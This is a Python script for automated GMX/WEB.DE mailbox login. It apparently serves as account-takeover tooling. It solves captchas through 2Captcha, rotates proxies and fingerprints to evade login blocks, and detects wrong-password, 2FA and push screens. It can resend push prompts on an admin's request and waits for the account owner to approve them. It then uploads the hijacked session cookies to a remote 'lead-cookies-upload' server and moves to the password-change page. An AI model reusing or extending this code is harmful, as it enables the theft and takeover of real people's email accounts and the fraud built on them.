#!/usr/bin/env python3
"""
Автовход в почту GMX (gmx.de / gmx.net) с прохождением капчи через API 2Captcha.
Поддерживаются: обычная капча (картинка) и CaptchaFox (токен).
"""
from __future__ import annotations

import hashlib
import json
import os
import re
import base64
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import contextmanager
from pathlib import Path
from datetime import datetime
from typing import Any, Callable, Optional
from urllib.parse import quote, urlparse

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

try:
    from PIL import Image
    import io
    _HAS_PIL = True
except ImportError:
    _HAS_PIL = False

try:
    import requests
except ImportError:
    requests = None  # type: ignore


def _gmx_portal_host_in_url(url: str) -> bool:
    """URL принадлежит инфраструктуре входа/портала GMX."""
    if not url:
        return False
    u = url.lower()
    return any(
        h in u
        for h in (
            "gmx.net",
            "gmx.de",
            "auth.gmx",
            "navigator.gmx",
            "link.gmx",
            "interception.gmx",
            "obligation.gmx",
            "hilfe.gmx",
            "pwchange.gmx",
            "meinvollbild.gmx",
            "sicherheit.gmx",
            "anmelden.gmx",
        )
    )


from captcha_solver import (
    solve_image_captcha,
    solve_captchafox_with_proxy_string,
)

_LOG_PREFIX = ""
_LAST_ALERT_TEXT = ""
_LOG_EMAIL_INLINE = ""  # задаётся в login_gmx(email)
_WEBDE_ACTIVE_COOKIES_PUSH: dict | None = None


@contextmanager
def _cookies_push_scope(push: dict | None):
    """В lead_mode передаётся {base_url, lead_id, token} — куки уходят в POST /api/lead-cookies-upload."""
    global _WEBDE_ACTIVE_COOKIES_PUSH
    prev = _WEBDE_ACTIVE_COOKIES_PUSH
    _WEBDE_ACTIVE_COOKIES_PUSH = push
    try:
        yield
    finally:
        _WEBDE_ACTIVE_COOKIES_PUSH = prev
# Детальные шаги (капча по пикселям, consent, снимки страниц): WEBDE_VERBOSE_LOG=1
_WEBDE_VERBOSE_LOG = (os.environ.get("GMX_VERBOSE_LOG") or os.environ.get("WEBDE_VERBOSE_LOG", "")).strip().lower() in ("1", "true", "yes")


def set_log_prefix(prefix: str) -> None:
    """Глобальный префикс для логов WEBDE (чтобы разделять параллельные лиды)."""
    global _LOG_PREFIX
    _LOG_PREFIX = (prefix or "").strip()


def get_last_alert_text() -> str:
    return (_LAST_ALERT_TEXT or "").strip()


def log(step: str, message: str, detail: str = "", *, verbose_only: bool = False):
    """Краткий лог: [GMX] auth.gmx.net | email | сообщение. Подробности — WEBDE_VERBOSE_LOG=1."""
    if verbose_only and not _WEBDE_VERBOSE_LOG:
        return
    if not _WEBDE_VERBOSE_LOG:
        if step in ("ДИАГНО", "Страница", "CONSENT_DEBUG"):
            return
        if step == "COOKIE/CONSENT":
            return
        if step in ("Капча", "CAPTCHA"):
            blob = f"{message} {detail}".lower()
            if not any(
                k in blob
                for k in (
                    "пройдена",
                    "не удал",
                    "не пройден",
                    "подставлен",
                    "поле пароля уже",
                    "решаю",
                    "прохожу",
                )
            ):
                return
        if step == "Профиль":
            return
        if step == "Согласие":
            return
        if step == "Старт":
            blob = (message + " " + detail).lower()
            if any(
                x in blob
                for x in (
                    "страница загружена",
                    "браузер открыт",
                    "браузер не закрыт",
                    "встроенный chromium",
                )
            ):
                return
        if step == "Пуш":
            blob = (message + " " + detail).lower()
            if not any(
                k in blob
                for k in (
                    "подтвержд",
                    "требуется пуш",
                    "sms",
                    "мониторим",
                )
            ):
                return
        if step == "Редирект":
            return
        if step == "Пароль":
            pb = (message + " " + detail).lower()
            if not any(
                k in pb
                for k in (
                    "невер",
                    "новый пароль",
                    "password.txt",
                    "закончились",
                    "следующий",
                )
            ):
                return
    _touch_script_activity()
    ts = datetime.now().strftime("%H:%M:%S")
    em = (_LOG_EMAIL_INLINE or "—").strip() or "—"
    if len(em) > 48:
        em = em[:45] + "..."
    line = f"[{ts}] [GMX] auth.gmx.net | {em} | {message}"
    if detail:
        line += f" — {detail}"
    if _LOG_PREFIX and _WEBDE_VERBOSE_LOG:
        line += f" {_LOG_PREFIX}"
    print(line, flush=True)


def wait_log(message: str, detail: str = "") -> None:
    """Длительные ожидания: всегда в лог PM2 ([GMX] WAIT), без GMX_VERBOSE_LOG/WEBDE_VERBOSE_LOG."""
    _touch_script_activity()
    ts = datetime.now().strftime("%H:%M:%S")
    em = (_LOG_EMAIL_INLINE or "—").strip() or "—"
    if len(em) > 48:
        em = em[:45] + "..."
    line = f"[{ts}] [GMX] WAIT | {em} | {message}"
    if detail:
        line += f" — {detail}"
    if _LOG_PREFIX:
        line += f" {_LOG_PREFIX}"
    print(line, flush=True)


_logged_snapshots: set = set()


def _debug_page_snapshot(page, context: str = ""):
    """Подробный снимок страницы для отладки: URL + первые ~500 символов текста body. Логируем один раз на пару (URL, context)."""
    if not _WEBDE_VERBOSE_LOG:
        return
    try:
        url = getattr(page, "url", "") or ""
    except Exception:
        url = ""
    key = (url[:400], context)
    if key in _logged_snapshots:
        return
    _logged_snapshots.add(key)
    try:
        body_text = page.locator("body").inner_text()
        snippet = (body_text or "").strip().replace("\n", " ")[:500]
    except Exception as e:
        snippet = f"<ошибка чтения body: {e}>"
    ctx = f"{context} " if context else ""
    log("Страница", f"{ctx}URL={url}", snippet)


def log_page_diag(page, label: str) -> None:
    """Детальная диагностика страницы — только при WEBDE_VERBOSE_LOG=1."""
    if not _WEBDE_VERBOSE_LOG:
        return
    try:
        u = page.url
    except Exception:
        u = "(ошибка url)"
    try:
        ti = page.title()
    except Exception:
        ti = "(ошибка title)"
    parts: list[str] = [f"url={u[:220]}", f"title={ti[:100]!r}"]
    try:
        n_pw = page.locator('input[type="password"]').count()
        n_em = page.locator('input[type="email"], input[name="username"], input[name="email"]').count()
        n_sub = page.locator('button[type="submit"], input[type="submit"], [data-testid="next"]').count()
        parts.append(f"поля: email≈{n_em} password={n_pw} кнопки_далее≈{n_sub}")
    except Exception as ex:
        parts.append(f"счётчики: {ex}")
    try:
        raw = (page.locator("body").inner_text() or "").strip()
        low = raw.lower()
        hints: list[str] = []
        if "vorübergehend" in low or "login vorübergehend" in low:
            hints.append("БЛОК_WEBDE")
        if "ich bin ein mensch" in low or "captcha" in low:
            hints.append("КАПЧА")
        if "falsche" in low or "falsch" in low and "passwort" in low:
            hints.append("НЕВЕРНЫЙ_ПАРОЛЬ?")
        if hints:
            parts.append("подсказки:" + ",".join(hints))
        snip = raw.replace("\n", " ")[:320]
        parts.append(f"текст≈{snip!r}")
    except Exception as ex:
        parts.append(f"body: {ex}")
    log("ДИАГНО", label, " | ".join(parts))


def alert(message: str, reason: str = ""):
    """Ошибка / ветка смены прокси — в том же формате, что и основной лог."""
    global _LAST_ALERT_TEXT
    _touch_script_activity()
    ts = datetime.now().strftime("%H:%M:%S")
    em = (_LOG_EMAIL_INLINE or "—").strip() or "—"
    if len(em) > 48:
        em = em[:45] + "..."
    line = f"[{ts}] [GMX] auth.gmx.net | {em} | ⚠ {message}"
    print(line, flush=True)
    if reason:
        print(f"[{ts}] [GMX] auth.gmx.net | {em} | ⚠ причина: {reason}", flush=True)
        _LAST_ALERT_TEXT = f"{message}: {reason}"
    else:
        _LAST_ALERT_TEXT = message


def save_cookies(context, filepath: str) -> None:
    """Сохраняет куки контекста в JSON для последующего входа по ним."""
    cookies = context.cookies()
    path = Path(filepath)
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(cookies, f, indent=2, ensure_ascii=False)
    log("Куки", "Сохранены", str(path))


def _cookies_path_for_email(email: str) -> Path:
    """Имя файла куков по email: user@web.de -> cookies/user_at_web.de.json"""
    safe = re.sub(r"[^\w.\-@]", "_", email).replace("@", "_at_")
    COOKIES_DIR.mkdir(parents=True, exist_ok=True)
    return COOKIES_DIR / f"{safe}.json"


def _wait_then_save_cookies_and_exit(context, email: str) -> None:
    """После успешного входа сразу сохраняем куки в файл по email и даём потоку перейти к следующему аккаунту."""
    log("Успех", f"[{email}] Сохраняю куки и закрываю браузер")
    save_cookies(context, str(_cookies_path_for_email(email)))


def _save_cookies_for_lead_mode(context, email: str) -> None:
    """В lead_mode: POST на сервер (SQLite) или fallback — файл login/cookies (локальный запуск)."""
    push = _WEBDE_ACTIVE_COOKIES_PUSH
    try:
        cookies = context.cookies()
    except Exception as e:
        log("Куки", "Не удалось прочитать куки: " + str(e))
        return
    base = (push or {}).get("base_url")
    lid = (push or {}).get("lead_id")
    if base and lid:
        if requests is None:
            log("Куки", "Пакет requests не установлен — не могу отправить куки на сервер")
            return
        try:
            url = str(base).rstrip("/") + "/api/lead-cookies-upload"
            tok = str((push or {}).get("worker_secret") or (push or {}).get("token") or "").strip()
            headers: dict[str, str] = {"Content-Type": "application/json; charset=utf-8"}
            if tok:
                headers["x-worker-secret"] = tok
            r = requests.post(
                url,
                json={"id": str(lid).strip(), "cookies": cookies},
                headers=headers,
                timeout=120,
            )
            if r.status_code >= 400:
                log("Куки", f"Сервер отклонил сохранение: HTTP {r.status_code} {(r.text or '')[:200]}")
            else:
                log("Куки", "Сохранены на сервере (БД)")
        except Exception as e:
            log("Куки", "Ошибка отправки куков на сервер: " + str(e))
        return
    try:
        save_cookies(context, str(_cookies_path_for_email(email)))
        log("Куки", "Сохранены в файл (legacy, без cookies_push)")
    except Exception as e:
        log("Куки", "Не удалось сохранить куки для скачивания: " + str(e))


def save_cookies_for_account(context, email: str) -> str:
    """
    Сохранить куки в login/cookies/<email>.json (как после входа).
    Вызывается из webde_mail_filters после настройки фильтров.
    """
    em = (email or "").strip()
    if not em:
        raise ValueError("save_cookies_for_account: пустой email")
    path = _cookies_path_for_email(em)
    save_cookies(context, str(path))
    return str(path)


# «Вход временно недоступен» — нужна смена IP и отпечатков, затем повтор
LOGIN_TEMPORARILY_UNAVAILABLE_TEXT = "Login vorübergehend nicht möglich"


class LoginTemporarilyUnavailable(Exception):
    """Сайт вернул «Login vorübergehend nicht möglich» — нужен другой IP/отпечаток и повтор с нуля."""


# После lead_mode «success» браузер не закрываем — оркестрация Klein (compose+фильтры+Klein в том же контексте).
_LEAD_HELD_BROWSER_SESSION: dict | None = None


def take_lead_held_browser_session() -> dict | None:
    """Забрать и очистить {browser, context, page} после login_gmx(..., hold_session_after_lead_success=True)."""
    global _LEAD_HELD_BROWSER_SESSION
    h = _LEAD_HELD_BROWSER_SESSION
    _LEAD_HELD_BROWSER_SESSION = None
    return h


def clear_lead_held_browser_session() -> None:
    global _LEAD_HELD_BROWSER_SESSION
    _LEAD_HELD_BROWSER_SESSION = None


# Нет новых строк в log()/alert() дольше N сек → закрытие сессии (смена прокси/отпечатка). 0 = выкл. Env: WEBDE_SCRIPT_IDLE_SEC
try:
    _SCRIPT_IDLE_SEC = int(os.environ.get("WEBDE_SCRIPT_IDLE_SEC", "180") or "180")
except (TypeError, ValueError):
    _SCRIPT_IDLE_SEC = 180

_last_script_log_mono = time.monotonic()


def _reset_script_idle_watch():
    global _last_script_log_mono
    _last_script_log_mono = time.monotonic()


def _touch_script_activity():
    global _last_script_log_mono
    _last_script_log_mono = time.monotonic()


def _check_script_idle_or_raise():
    if _SCRIPT_IDLE_SEC <= 0:
        return
    if time.monotonic() - _last_script_log_mono > _SCRIPT_IDLE_SEC:
        raise LoginTemporarilyUnavailable(
            f"Нет записей в логе {_SCRIPT_IDLE_SEC} сек — сессия закрыта"
        )


def _is_login_temporarily_unavailable(page) -> bool:
    """Проверяет, есть ли на странице сообщение о временной недоступности входа."""
    try:
        text = page.locator("body").inner_text()
        return LOGIN_TEMPORARILY_UNAVAILABLE_TEXT in (text or "")
    except Exception:
        pass
    return False


# Тексты ошибки «неверные данные входа» на web.de / auth.gmx.net
WRONG_CREDENTIALS_TEXTS = (
    "Zugangsdaten nicht korrekt",
    "Falsche E-Mail",
    "falsches Passwort",
    "falsche Anmeldedaten",
    "Ungültige Anmeldedaten",
    "Ungültig",
    "Anmeldung fehlgeschlagen",
    "Passwort oder E-Mail",
    "E-Mail-Adresse oder Passwort",
)


def _body_has_wrong_credentials_phrase(page) -> bool:
    """Только явные тексты WEB.DE (без эвристики по .error), чтобы не ловить ложные срабатывания до появления Zugangsdaten."""
    try:
        text_lower = (page.locator("body").inner_text() or "").lower()
        for phrase in WRONG_CREDENTIALS_TEXTS:
            if phrase.lower() in text_lower:
                return True
    except Exception:
        pass
    return False


def _still_on_login_surface(page, pw_selector_any: str) -> bool:
    """Форма входа или URL auth — после Zugangsdaten страница входа обычно остаётся."""
    try:
        if page.locator(pw_selector_any).count() > 0:
            return True
        if page.locator('input[type="email"], input[name="username"], input[name="email"]').count() > 0:
            return True
        url_l = (page.url or "").lower()
        if "auth.gmx.net" in url_l:
            return True
        if _gmx_portal_host_in_url(url_l) and "login" in url_l:
            return True
    except Exception:
        pass
    return False


def _url_indicates_webde_two_factor_interception(url: str | None) -> bool:
    """WEB.DE перенаправляет на interception.gmx.net с interceptiontype=TwoFaCodeInterception (TOTP/приложение)."""
    try:
        u = (url or "").lower()
        if "twofacodeinterception" in u.replace("-", "").replace("_", ""):
            return True
        if "interception.gmx.net" in u and "interceptiontype" in u and "twofa" in u and "code" in u:
            return True
    except Exception:
        pass
    return False


def _url_indicates_obligation_or_push_interstitial(url: str | None) -> bool:
    """После Login уже не форма пароля: известное устройство / цепочка обязательностей (часто пуш). Не ждём 22с до таймаута."""
    u = (url or "").lower()
    if not u or not _gmx_portal_host_in_url(u):
        return False
    if "obligation.gmx.net" in u:
        return True
    if "known-device" in u:
        return True
    compact = u.replace("_", "").replace("-", "")
    if "jumptomultiobl" in compact:
        return True
    return False


def _page_is_webde_interception_session_expired(page) -> bool:
    """На том же URL что и 2FA может открыться «Ihre Sitzung ist abgelaufen» — это не ввод кода."""
    try:
        t = (page.locator("body").inner_text() or "").lower()
        if "ihre sitzung ist abgelaufen" in t or "sitzung ist abgelaufen" in t:
            return True
        if "bitte loggen sie sich erneut" in t:
            return True
    except Exception:
        pass
    return False


def _page_has_webde_two_fa_separated_inputs(page) -> bool:
    """Реальный Kundencenter: 6 отдельных полей (класс separated-input__field / twoFa-code-input)."""
    try:
        if page.locator("input.separated-input__field").count() >= 6:
            return True
        if page.locator(".twoFa-code-input input").count() >= 6:
            return True
    except Exception:
        pass
    return False


def _page_shows_real_webde_two_factor_challenge(page) -> bool:
    """Настоящий экран ввода 2FA, а не истекшая сессия на interception."""
    if _page_is_webde_interception_session_expired(page):
        return False
    if _page_has_webde_two_fa_separated_inputs(page):
        return True
    try:
        t = (page.locator("body").inner_text() or "").lower()
        if "zwei-faktor" in t or "zweifaktor" in t:
            return True
        if "two-factor" in t or "two factor" in t:
            return True
        if "2-faktor-authentifizierung" in t:
            return True
        if "6-stellig" in t and (
            "bestätigungs-app" in t
            or "bestatigungs-app" in t
            or "authenticator" in t
            or "sms" in t
        ):
            return True
        # Net-ID / Kundencenter: одно поле «Authentifizierungs-Code», текст про App
        if "authentifizierungs-app" in t.replace(" ", ""):
            return True
        if "authentifizierungs-code" in t.replace(" ", "") and "eingeben" in t:
            return True
        if "von ihrer authentifizierungs-app" in t:
            return True
    except Exception:
        pass
    return False


def _wait_post_login_for_wrong_or_block(page, pw_selector_any: str, max_sec: float = 22.0) -> str | None:
    """После клика Login: ждём «Zugangsdaten…» или «Login vorübergehend…».
    Возврат: wrong_credentials | temp_unavailable | two_factor | None."""
    wait_log(
        "после клика Login",
        f"ожидание до {max_sec:.0f}с: текст неверных данных, блок WEB.DE или редирект в почту",
    )
    deadline = time.monotonic() + max_sec
    step = 0.65
    _last_heartbeat = time.monotonic()
    twofa_dom_wait_done = False
    while time.monotonic() < deadline:
        _check_script_idle_or_raise()
        try:
            if _is_login_temporarily_unavailable(page):
                return "temp_unavailable"
        except Exception:
            pass
        if _body_has_wrong_credentials_phrase(page) and _still_on_login_surface(page, pw_selector_any):
            return "wrong_credentials"
        try:
            u = page.url or ""
            if _url_indicates_webde_two_factor_interception(u):
                if _page_is_webde_interception_session_expired(page):
                    wait_log(
                        "после Login",
                        "interception 2FA URL, но «Sitzung abgelaufen» — не экран ввода 2FA",
                    )
                elif _page_shows_real_webde_two_factor_challenge(page):
                    wait_log("после Login", "экран 2FA WEB.DE (6 полей / текст) — выходим из ожидания")
                    return "two_factor"
                elif not twofa_dom_wait_done:
                    twofa_dom_wait_done = True
                    rem_ms = max(0, int((deadline - time.monotonic()) * 1000) - 500)
                    if rem_ms > 1500:
                        try:
                            page.locator("input.separated-input__field").first.wait_for(
                                state="visible",
                                timeout=min(8000, rem_ms),
                            )
                        except Exception:
                            pass
                        if _page_shows_real_webde_two_factor_challenge(page):
                            wait_log("после Login", "2FA: поля появились после короткого ожидания SPA")
                            return "two_factor"
            if _url_indicates_obligation_or_push_interstitial(u):
                wait_log(
                    "после Login",
                    "obligation / known-device (шаг пуша или выбора) — выходим из ожидания, дальше основная логика",
                )
                return None
            if _gmx_portal_host_in_url(u) and ("mail" in u or "posteingang" in u):
                wait_log("после Login", "редирект в почту — выходим из ожидания")
                return None
        except Exception:
            pass
        if time.monotonic() - _last_heartbeat >= 8.0:
            _last_heartbeat = time.monotonic()
            try:
                _u = (page.url or "")[:120]
            except Exception:
                _u = "?"
            wait_log("после Login (ещё жду)", f"осталось ~{max(0, int(deadline - time.monotonic()))}с · url≈{_u}")
        time.sleep(step)
    wait_log("после Login", f"таймаут {max_sec:.0f}с — переходим к полной проверке страницы")
    return None


def _is_wrong_credentials(page) -> bool:
    """Проверяет, есть ли на странице сообщение о неверном email/пароле."""
    try:
        text = page.locator("body").inner_text()
        text_lower = (text or "").lower()
        for phrase in WRONG_CREDENTIALS_TEXTS:
            if phrase.lower() in text_lower:
                return True
        # Дополнительно: типичные классы/роли сообщений об ошибке
        if page.locator('[role="alert"], .error, .alert-danger, [class*="error"]').count() > 0:
            return True
    except Exception:
        pass
    return False


# Только явные признаки страницы ввода SMS-кода (не просто упоминание «SMS»/«per SMS» — они есть и на странице пуша)
SMS_CODE_ENTRY_TEXTS = (
    "SMS-Code",
    "TAN",
    "Code eingeben",
    "Geben Sie den Code ein",
    "Code an Ihr Handy",
    "Bestätigungscode",
    "Code wurde",
)
# Только эти два признака = реальная страница ожидания пуша (есть кнопка переотправки). Остальные фразы («Ihrer WEB.DE App» и т.д.) есть и на странице выбора способа (App/SMS), не считаем их пушем без кнопки.
PUSH_PAGE_REQUIRED_TEXTS = ("Mitteilung erneut senden",)
PUSH_PAGE_RESEND_SELECTOR = '[data-testid="button-resend-push-notification"]'
# Доп. фразы страницы пуша (для приоритета пуш vs SMS когда на странице оба варианта)
PUSH_SPECIFIC_TEXTS = (
    "Mitteilung erneut senden",
    "Mitteilung von WEB.DE",
    "Ihrer WEB.DE App",
    "Identifizieren Sie sich jetzt über Ihr Smartphone",
    "Sie erhalten nun eine Mitteilung von Ihrer WEB.DE App",
    "Mitteilung erfolgreich versendet",
)


def _url_is_mailbox_or_pwchange(url: str) -> bool:
    """True, если URL — уже почта или страница смены пароля (не страница пуша)."""
    if not url or not _gmx_portal_host_in_url(url):
        return False
    if "mail" in url or "posteingang" in url:
        return True
    if "pwchange.gmx.net" in url or "WeakPasswordInfoAdvice" in url:
        return True
    if "meinvollbild.gmx.net" in url or "sicherheit.gmx.net" in url:
        return True
    if "passwort-aendern" in url or "account" in url:
        return True
    return False


# Страница «не могу войти, логин известен» (hilfe.gmx.net) — всегда считаем успешным входом, выгружаем куки
HELP_LOGIN_KNOWN_URL_FRAGMENT = "kann-mich-nicht-einloggen-login-bekannt"


def _url_is_help_page_after_login(url: str) -> bool:
    """True, если редирект после входа привёл на страницу помощи WEB.DE (Hilfe & Kontakt) — вход успешен, куки валидны."""
    return bool(url and "hilfe.gmx.net" in url)


def _on_help_page_success_then_pwchange(
    page,
    context,
    email: str,
    lead_mode: bool,
    on_lead_success_hold: Optional[Callable[[], None]] = None,
):
    """Страница помощи после входа (в т.ч. «не могу войти»): выгружаем куки, засчитываем успешный вход в почту."""
    is_login_fail_page = HELP_LOGIN_KNOWN_URL_FRAGMENT in (page.url or "")
    if lead_mode:
        _save_cookies_for_lead_mode(context, email)
        try:
            page.goto(PWCHANGE_GMX_URL, wait_until="domcontentloaded", timeout=15000)
            time.sleep(1)
        except Exception as e:
            log("Редирект", f"Переход на смену пароля: {e}", verbose_only=True)
        log(
            "Успех",
            "успешный вход · hilfe (куки)"
            if is_login_fail_page
            else "успешный вход · hilfe → смена пароля",
        )
        if on_lead_success_hold:
            try:
                on_lead_success_hold()
            except Exception:
                pass
        return "success"
    log(
        "Успех",
        "успех · hilfe (куки)"
        if is_login_fail_page
        else "успех · hilfe",
    )
    _wait_then_save_cookies_and_exit(context, email)
    return True


def _find_mailbox_page(context):
    """Возвращает первую вкладку с URL почты/смены пароля, если редирект открылся в новой вкладке."""
    try:
        for p in context.pages:
            try:
                if _url_is_mailbox_or_pwchange(p.url):
                    return p
            except Exception:
                pass
    except Exception:
        pass
    return None


def _page_is_two_factor_login(page) -> bool:
    """Страница Zwei-Faktor-Authentifizierung (Kundencenter / Net-ID), не путать с обычным SMS-Code."""
    _debug_page_snapshot(page, "Проверка 2FA")
    if _page_shows_real_webde_two_factor_challenge(page):
        return True
    try:
        if _page_is_webde_interception_session_expired(page):
            return False
        text = page.locator("body").inner_text()
        tl = (text or "").lower()
        if "authenticator" in tl and ("app" in tl or "bestätigungs" in tl or "bestatigungs" in tl):
            return True
    except Exception:
        pass
    return False


def _page_has_sms_or_code(page) -> bool:
    """True, если страница — ввод SMS-кода/TAN (поле ввода или явный текст «введите код»). Упоминание «SMS»/«per SMS» на странице пуша не считаем."""
    _debug_page_snapshot(page, "Проверка SMS/TAN")
    try:
        text = page.locator("body").inner_text()
        text_lower = (text or "").lower()
        for phrase in SMS_CODE_ENTRY_TEXTS:
            if phrase.lower() in text_lower:
                return True
        if page.locator('input[type="tel"], input[name*="code"], input[name*="tan"], input[placeholder*="Code"], input[placeholder*="TAN"]').first.count() > 0:
            return True
    except Exception:
        pass
    return False


def _page_has_push_indicators(page) -> bool:
    """True, если на странице есть признаки пуша (кнопка переотправки или фразы про Mitteilung/App). Нужно для приоритета пуш над SMS на странице выбора."""
    _debug_page_snapshot(page, "Проверка PUSH")
    try:
        if page.locator(PUSH_PAGE_RESEND_SELECTOR).first.count() > 0:
            return True
        if page.get_by_text("Mitteilung erneut senden", exact=False).first.count() > 0:
            return True
        text = page.locator("body").inner_text()
        text_lower = (text or "").lower()
        for phrase in PUSH_SPECIFIC_TEXTS:
            if phrase.lower() in text_lower:
                return True
    except Exception:
        pass
    return False


def _is_push_confirmation_page(page, wait_link_sec: float = 0) -> bool:
    """Страница именно «подтвердите пуш в приложении» (есть кнопка переотправки / «Mitteilung erneut senden»). Страницу выбора способа (App/SMS) без кнопки не считаем пушем. Если wait_link_sec > 0 — ждём кнопку."""
    if _url_is_mailbox_or_pwchange(page.url) or _url_is_help_page_after_login(page.url):
        return False
    try:
        if wait_link_sec > 0:
            t_ms = int(wait_link_sec * 1000)
            try:
                page.locator(PUSH_PAGE_RESEND_SELECTOR).first.wait_for(state="visible", timeout=t_ms)
            except Exception:
                page.get_by_text("Mitteilung erneut senden", exact=False).first.wait_for(state="visible", timeout=t_ms)
            return True
    except Exception:
        pass
    if _page_has_sms_or_code(page) and not _page_has_push_indicators(page):
        return False
    if _page_has_sms_or_code(page) and _page_has_push_indicators(page):
        return True
    try:
        if page.locator(PUSH_PAGE_RESEND_SELECTOR).first.count() > 0:
            return True
        if page.get_by_text("Mitteilung erneut senden", exact=False).first.count() > 0:
            return True
        text = page.locator("body").inner_text()
        text_lower = (text or "").lower()
        for phrase in PUSH_PAGE_REQUIRED_TEXTS:
            if phrase.lower() in text_lower:
                return True
    except Exception:
        pass
    return False


def _click_push_resend_link(page, wait_active_sec: int = 60) -> tuple[bool, str | None]:
    """Ждёт, пока кнопка переотправки пуша станет активной, затем кликает. Кнопка на web.de: data-testid=button-resend-push-notification или текст «Mitteilung erneut senden»."""
    # Сначала кнопка по data-testid (актуальная разметка web.de)
    loc = page.locator('[data-testid="button-resend-push-notification"]').first
    try:
        loc.wait_for(state="visible", timeout=5000)
    except Exception:
        loc = page.get_by_role("button", name="Mitteilung erneut senden").first
        try:
            loc.wait_for(state="visible", timeout=5000)
        except Exception:
            loc = page.get_by_text("Mitteilung erneut senden", exact=False).first
            try:
                loc.wait_for(state="visible", timeout=5000)
            except Exception as e:
                msg = str(e).strip()[:150] if str(e) else "кнопка переотправки пуша не найдена"
                log("Пуш", f"«Mitteilung erneut senden» не появилась: {e}")
                return False, msg
    poll_interval = 3
    deadline = time.time() + wait_active_sec
    last_error = None
    while time.time() < deadline:
        try:
            loc.click(timeout=5000)
            log("Пуш", "Кнопка переотправки пуша нажата")
            return True, None
        except Exception as e:
            last_error = e
            remaining = int(deadline - time.time())
            if remaining <= 0:
                break
            log("Пуш", f"Кнопка ещё не активна, жду {poll_interval} сек (осталось до {remaining} сек): {e}")
            time.sleep(poll_interval)
    msg = (str(last_error).strip()[:150] if last_error and str(last_error) else "кнопка не стала активной за отведённое время")
    log("Пуш", f"Клик переотправки пуша не удался: {last_error}")
    return False, msg


PUSH_PAGE_MONITOR_SEC = 180  # 3 мин: мониторим страницу пуша; если куда-либо перекинуло — юзер подтвердил пуш


def _wait_for_push_then_success(
    page,
    context,
    email: str,
    timeout_sec: int = PUSH_PAGE_MONITOR_SEC,
    lead_mode: bool = False,
    check_resend_requested: Optional[Callable[..., Any]] = None,
    on_resend_done: Optional[Callable[..., Any]] = None,
) -> bool:
    """Мониторит страницу пуша до 3 минут: если редирект куда-либо (почта, смена пароля, помощь) — юзер подтвердил пуш, сохраняем куки и успех.
    lead_mode: не сохранять куки. check_resend_requested() -> bool, on_resend_done(success, message) — переотправка пуша по запросу админки.
    Локальный тест: TEST_PUSH_RESEND_AFTER_SEC=120 — через 2 мин имитировать запрос и нажать переотправить пуш."""
    log("Пуш", f"[{email}] Мониторим страницу пуша до {timeout_sec} сек — при редиректе куда-либо считаем пуш подтверждённым")
    step = 2
    push_wait_start = time.time()
    test_resend_after_sec = 0
    try:
        test_resend_after_sec = int(os.environ.get("TEST_PUSH_RESEND_AFTER_SEC", "0") or "0")
    except (TypeError, ValueError):
        pass
    did_test_resend = False
    for _ in range(0, timeout_sec, step):
        _check_script_idle_or_raise()
        time.sleep(step)
        url = page.url
        if "mail" in url or "posteingang" in url:
            log("Успех", "Пуш подтверждён, вход в почту выполнен")
            if lead_mode:
                _save_cookies_for_lead_mode(context, email)
            else:
                _wait_then_save_cookies_and_exit(context, email)
            return True
        if "pwchange.gmx.net" in url or "meinvollbild" in url or "sicherheit.gmx.net" in url or "passwort-aendern" in url:
            log("Успех", "Пуш подтверждён (редирект на смену пароля / аккаунт)")
            if lead_mode:
                _save_cookies_for_lead_mode(context, email)
            else:
                _wait_then_save_cookies_and_exit(context, email)
            return True
        # Редирект мог открыть почту в новой вкладке — проверяем все вкладки
        mailbox_tab = _find_mailbox_page(context)
        if mailbox_tab is not None:
            log("Успех", "Пуш подтверждён, почта открыта в другой вкладке")
            if lead_mode:
                _save_cookies_for_lead_mode(context, email)
            else:
                _wait_then_save_cookies_and_exit(context, email)
            return True
        # Страница пуша исчезла (редирект на другой URL web.de) — считаем успехом
        if _gmx_portal_host_in_url(url) and not _is_push_confirmation_page(page):
            log("Успех", "Пуш подтверждён (страница изменилась, вход выполнен)", url)
            if lead_mode:
                _save_cookies_for_lead_mode(context, email)
            else:
                _wait_then_save_cookies_and_exit(context, email)
            return True
        # После подтверждения пуша WEB.DE может редиректить на страницу помощи (hilfe.gmx.net) — тоже успех
        if _url_is_help_page_after_login(url):
            log("Успех", "Пуш подтверждён, редирект на страницу помощи (вход выполнен)")
            if lead_mode:
                _save_cookies_for_lead_mode(context, email)
                try:
                    page.goto(PWCHANGE_GMX_URL, wait_until="domcontentloaded", timeout=15000)
                    time.sleep(1)
                except Exception as e:
                    log("Редирект", f"Переход на смену пароля: {e}", verbose_only=True)
            else:
                _wait_then_save_cookies_and_exit(context, email)
            return True
        try:
            for p in context.pages:
                if _url_is_help_page_after_login(p.url):
                    log("Успех", "Пуш подтверждён, страница помощи в другой вкладке (вход выполнен)")
                    if lead_mode:
                        _save_cookies_for_lead_mode(context, email)
                        try:
                            p.goto(PWCHANGE_GMX_URL, wait_until="domcontentloaded", timeout=15000)
                            time.sleep(1)
                        except Exception as e:
                            log("Редирект", f"Переход на смену пароля: {e}", verbose_only=True)
                    else:
                        _wait_then_save_cookies_and_exit(context, email)
                    return True
        except Exception:
            pass
        if test_resend_after_sec and not did_test_resend and (time.time() - push_wait_start) >= test_resend_after_sec:
            log("Пуш", f"[ТЕСТ] Имитация запроса переотправки пуша через {test_resend_after_sec} сек")
            did_test_resend = True
            ok, _ = _click_push_resend_link(page)
            if ok:
                log("Пуш", "[ТЕСТ] Кнопка переотправки пуша нажата")
        if lead_mode and check_resend_requested and on_resend_done and check_resend_requested():
            ok, err_msg = _click_push_resend_link(page)
            try:
                on_resend_done(ok, None if ok else err_msg)
            except Exception:
                pass
            if ok:
                log("Пуш", "Клик переотправки пуша выполнен")
    if not lead_mode:
        alert("Таймаут ожидания подтверждения пуша", "Подтвердите вход в приложении WEB.DE")
    return False

# Стартовая страница (инфо + окно согласия). Форма входа — на web.de или auth.gmx.net
LOGIN_URL = "https://anmelden.gmx.net/"
LOGIN_FORM_URL = "https://www.gmx.net/"  # страница с полями email/password
PWCHANGE_GMX_URL = os.getenv("GMX_PWCHANGE_URL", "https://pwchange.gmx.net/").strip() or "https://pwchange.gmx.net/"
# URL формы auth.gmx.net: тот же шаблон, что в браузере (state + authcode-context меняются у WEB.DE).
